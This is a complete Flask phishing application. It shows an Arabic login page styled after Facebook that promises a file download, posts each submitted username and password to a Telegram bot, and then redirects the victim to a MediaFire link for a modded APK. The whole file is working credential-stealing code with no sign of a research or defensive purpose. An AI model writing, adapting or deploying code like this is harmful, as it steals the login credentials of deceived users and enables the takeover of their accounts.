import os
import threading
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_to_telegram_background(message):
  if not BOT_TOKEN or not CHAT_ID:
    return
  url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
  payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
  try:
    requests.post(url, json=payload, timeout=5)
  except:
    pass


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; margin: 0; padding: 20px; }
        .login-container { background: #fff; width: 100%; max-width: 420px; padding: 40px 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); display: flex; flex-direction: column; align-items: center; }
        h2 { margin-bottom: 30px; color: #1c1e21; font-size: 24px; text-align: center; font-weight: bold; }
        .form-group { width: 100%; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; border: 1px solid #ccd0d5; border-radius: 10px; font-size: 16px; outline: none; background: #fff; transition: border 0.2s; }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
        button { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        button:hover { background: #166fe5; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>تسجيل الدخول للمتابعة</h2>
        <form action="/submit" method="POST">
            <div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required></div>
            <div class="form-group"><input type="password" name="password" placeholder="كلمة المرور" required></div>
            <button type="submit">دخول وتحميل الملف</button>
        </form>
    </div>
</body>
</html>
"""


@app.route("/")
def home():
  return render_template_string(HTML_TEMPLATE)


@app.route("/submit", methods=["POST"])
def submit():
  username = request.form.get("username")
  password = request.form.get("password")

  msg = f"🚨 <b>بيانات جديدة:</b>\n👤 <b>المستخدم:</b> {username}\n🔑 <b>الباسورد:</b> {password}"

  # إرسال الرسالة في الخلفية لضمان عدم تجمد الشاشة وسرعة التحويل
  thread = threading.Thread(
      target=send_to_telegram_background, args=(msg,)
  )
  thread.start()

  # التحويل الفوري لميديافاير بدون أي تأخير
  return redirect(
      "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
